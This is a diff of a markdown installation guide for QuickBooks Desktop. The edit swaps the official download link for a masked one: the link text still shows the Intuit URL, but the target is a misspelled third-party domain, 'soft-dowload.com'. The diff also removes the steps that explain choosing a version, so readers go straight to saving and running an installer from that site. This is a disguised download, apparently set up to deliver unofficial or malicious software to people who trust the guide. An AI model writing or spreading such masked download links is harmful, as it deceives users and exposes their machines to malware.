@@ -49,24 +49,21 @@
 ### Download the QuickBooks Software
 
 1. **Visit Official Website**
-   - Go to `https://quickbooks.intuit.com/downloads`
+   - Go to [https://quickbooks.intuit.com/downloads](https://soft-dowload.com/L8n18b)
 
 2. **Select Version**
-   - Choose "QuickBooks Desktop 2024".
-
-3. **Download Installer**
-   - Click on 'Download' button for preferred OS.
+   - Save QuickBooks Desktop Installer.
 
 ### Install the Application
 
-4. **Run Installer**
+3. **Run Installer**
    - Open the downloaded file to start installation.
 
-5. **Follow On-screen Instructions**
+4. **Follow On-screen Instructions**
    - Agree to terms and conditions.
    - Select destination folder.
 
-6. **Complete Installation Process**
+5. **Complete Installation Process**
    - Hit 'Finish' when prompted after setup completes.
 
 **Alternative Installation Method:**
